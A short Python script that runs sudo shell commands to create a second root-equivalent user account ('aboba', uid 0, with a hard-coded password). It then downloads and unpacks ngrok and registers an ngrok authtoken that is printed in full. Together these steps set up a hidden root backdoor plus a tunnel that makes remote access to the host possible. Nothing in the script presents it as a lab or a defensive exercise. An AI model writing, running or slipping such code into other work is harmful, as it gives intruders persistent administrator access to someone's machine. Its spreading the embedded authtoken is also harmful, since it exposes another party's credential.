import os

os.system("sudo useradd -p ugabuga -o -u 0 -g 0 -s /bin/bash aboba")
os.system("sudo wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz")
os.system("sudo tar xvzf ngrok-v3-stable-linux-amd64.tgz")
os.system("sudo ./ngrok config add-authtoken 2GAloqk72NJEIHPcfcVjzihfOX7_2rMRnADVuT79YXXQR9F4M")